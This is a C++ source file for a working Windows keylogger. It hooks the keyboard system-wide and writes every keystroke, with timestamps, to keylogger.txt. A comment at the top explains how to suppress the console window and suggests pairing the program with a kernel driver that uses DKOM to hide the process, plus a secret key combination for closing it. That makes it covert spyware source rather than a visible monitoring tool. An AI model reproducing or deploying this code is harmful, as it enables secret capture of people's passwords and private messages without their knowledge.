#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <ctime>

/*
To make this application run in the background, add:
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
This will stop console creation.
Tie this with your kernel driver to DKOM this and the driver itself

Make it so you can close the application after DKOM with a certain key combination maybe
like if F1, F3, and F5 are all close then close process. Something someone wouldn't usually do 
*/

std::ofstream logFile;
HHOOK keyboardHook = NULL;
bool isFirstKey = true;

static bool keyDown[256] = { false };
static int  backspaceRun = 0;

std::string getFormattedTime() {
    time_t now = time(0);
    struct tm timeinfo;
    localtime_s(&timeinfo, &now);
    char buffer[20];
    strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);
    return std::string(buffer);
}

static void flushBackspaceRun() {
    if (backspaceRun > 0) {
        if (backspaceRun == 1)
            logFile << "[<BS]";
        else
            logFile << "[<" << backspaceRun << "x BS]";
        backspaceRun = 0;
    }
}


static bool isModifierKey(int vkCode) {
    return vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
        vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
        vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU;
}


void logKey(int vkCode) {
    if (!logFile.is_open()) return;

    if (isModifierKey(vkCode)) {
        logFile.flush();
        return;
    }

    if (isFirstKey) {
        logFile << "\n" << std::string(60, '=') << "\n";
        logFile << "SESSION STARTED: " << getFormattedTime() << "\n";
        logFile << std::string(60, '=') << "\n\n";
        isFirstKey = false;
    }

    if (vkCode == VK_BACK) {
        backspaceRun++;
        logFile.flush();
        return;
    }
    flushBackspaceRun();

    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;


    if (vkCode == VK_SPACE) {
        logFile << " ";
    }
    else if (vkCode == VK_RETURN) {
        logFile << "\n" << getFormattedTime() << " ";
    }
    else if (vkCode == VK_TAB) {
        logFile << getFormattedTime() << "[TAB] ";
    }
    else if (vkCode == VK_ESCAPE) {
        logFile << getFormattedTime() << "[ESC] ";
    }
    else if (vkCode == VK_DELETE) {
        logFile << getFormattedTime() << "[DELETE] ";
    }

    // --- Letters A-Z (0x41 - 0x5A) ---
    else if (vkCode >= 0x41 && vkCode <= 0x5A) {
        bool isUpperCase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
        if (isUpperCase) logFile << (char)vkCode;           
        else             logFile << (char)(vkCode + 32);     
    }

    // --- Digits 0-9 (0x30 - 0x39) ---
    else if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (shiftPressed) {
            char shiftNumbers[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
            logFile << shiftNumbers[vkCode - 0x30];
        }
        else {
            logFile << (char)vkCode;
        }
    }

    else if (vkCode == VK_OEM_1)     
        logFile << (shiftPressed ? ':' : ';');
    else if (vkCode == VK_OEM_PLUS)   
        logFile << (shiftPressed ? '+' : '=');
    else if (vkCode == VK_OEM_COMMA)  
        logFile << (shiftPressed ? '<' : ',');
    else if (vkCode == VK_OEM_MINUS) 
        logFile << (shiftPressed ? '_' : '-');
    else if (vkCode == VK_OEM_PERIOD) 
        logFile << (shiftPressed ? '>' : '.');
    else if (vkCode == VK_OEM_2)      
        logFile << (shiftPressed ? '?' : '/');
    else if (vkCode == VK_OEM_3)      
        logFile << (shiftPressed ? '~' : '`');
    else if (vkCode == VK_OEM_4)     
        logFile << (shiftPressed ? '{' : '[');
    else if (vkCode == VK_OEM_5)      
        logFile << (shiftPressed ? '|' : '\\');
    else if (vkCode == VK_OEM_6)      
        logFile << (shiftPressed ? '}' : ']');
    else if (vkCode == VK_OEM_7)      
        logFile << (shiftPressed ? '"' : '\'');


    else if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        logFile << getFormattedTime() << " [F" << ((vkCode - VK_F1) + 1) << "] ";
    }

    else if (vkCode == VK_LEFT)  
        logFile << getFormattedTime() << " [LEFT] ";
    else if (vkCode == VK_RIGHT) 
        logFile << getFormattedTime() << " [RIGHT] ";
    else if (vkCode == VK_UP)    
        logFile << getFormattedTime() << " [UP] ";
    else if (vkCode == VK_DOWN)  
        logFile << getFormattedTime() << " [DOWN] ";


    else if (vkCode == VK_CAPITAL)  
        logFile << getFormattedTime() << " [CAPSLOCK] ";
    else if (vkCode == VK_NUMLOCK)  
        logFile << getFormattedTime() << " [NUMLOCK] ";
    else if (vkCode == VK_SCROLL)   
        logFile << getFormattedTime() << " [SCROLLLOCK] ";
    else if (vkCode == VK_LWIN)     
        logFile << getFormattedTime() << " [LWIN] ";
    else if (vkCode == VK_RWIN)     
        logFile << getFormattedTime() << " [RWIN] ";
    else if (vkCode == VK_APPS)     
        logFile << getFormattedTime() << " [APPS] ";

    else if (vkCode == VK_RETURN)   
        logFile << getFormattedTime() << " [ENTER] ";

    else {
        logFile << getFormattedTime()
            << " [UNKNOWN_KEY:" << vkCode
            << " (0x" << std::hex << vkCode << std::dec << ")]";
    }

    logFile.flush();
}

LRESULT CALLBACK LowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        int vk = (int)((KBDLLHOOKSTRUCT*)lParam)->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (!keyDown[vk]) {          
                keyDown[vk] = true;
                logKey(vk);
            }
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            keyDown[vk] = false;
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


BOOL WINAPI consoleHandler(DWORD dwType) {
    if (dwType == CTRL_CLOSE_EVENT) {
        if (logFile.is_open()) {
            flushBackspaceRun();
            logFile << "\n" << std::string(60, '=') << "\n";
            logFile << "SESSION ENDED: " << getFormattedTime() << "\n";
            logFile << std::string(60, '=') << "\n\n";
            logFile.flush();
            logFile.close();
        }
        if (keyboardHook != NULL) {
            UnhookWindowsHookEx(keyboardHook);
            keyboardHook = NULL;
        }
    }
    return TRUE;
}

int main() {
    std::cout << "Welcome to your keylogger!\n";
    std::cout << "All keystrokes will be logged to keylogger.txt\n";

    logFile.open("keylogger.txt", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Could not open keylogger.txt for writing.\n";
        std::cerr << "(Is it locked by another program?)\n";
        return 1;
    }

    SetConsoleCtrlHandler(consoleHandler, TRUE);
    HINSTANCE hInstance = GetModuleHandle(NULL);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyBoardProc, hInstance, 0);
    if (keyboardHook == NULL) {
        std::cerr << "Failed to hook keyboard\n";
        std::cerr << "Please make sure you're running this as an administrator\n";
        logFile.close();
        return 1;
    }

    std::cout << "Keyboard hook successful\n";
    std::cout << "Monitoring keyboard input... (close this window to stop)\n";

    MSG msg;
    BOOL bRet;
    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
        if (bRet == -1) {
            std::cerr << "There was an error in your message loop\n";
            break;
        }
        else {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    if (logFile.is_open()) {
        flushBackspaceRun();
        logFile << "\n" << std::string(60, '=') << "\n";
        logFile << "SESSION ENDED: " << getFormattedTime() << "\n";
        logFile << std::string(60, '=') << "\n\n";
        logFile.flush();
        logFile.close();
    }

    if (keyboardHook != NULL) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }

    std::cout << "Keyboard no longer hooked!\n";
    return 0;
}